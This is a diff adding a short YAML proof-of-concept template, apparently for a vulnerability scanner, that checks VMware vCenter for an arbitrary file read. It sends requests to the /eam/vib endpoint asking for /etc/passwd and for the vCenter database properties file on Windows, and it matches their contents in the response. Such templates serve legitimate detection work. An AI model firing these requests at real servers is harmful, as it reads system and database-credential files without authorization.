@@ -1,0 +1,23 @@
+detail:
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  links:
+  - https://t.co/LfvbyBUhF5
+expression: win0() || linux0()
+manual: true
+name: poc-yaml-vmware-vcenter-arbitrary-file-read
+rules:
+  linux0:
+    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /eam/vib?id=/etc/passwd
+  win0:
+    expression: response.status == 200 && response.body.bcontains(b"org.postgresql.Driver")
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
+transport: http
